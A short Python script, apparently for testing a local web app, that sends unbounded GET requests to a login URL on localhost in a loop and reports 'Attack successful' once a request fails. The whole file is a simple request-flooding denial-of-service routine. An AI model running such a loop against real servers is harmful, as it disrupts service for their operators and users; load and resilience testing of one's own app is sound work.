import requests

def attack():
    print('Begin attack')

    i = 0
    try:
        while(True):
            res = requests.get('http://127.0.0.1:3000/user/login/test/test')
            i += 1
    except: 
        print('Attack successful after', i, 'requests')

attack()
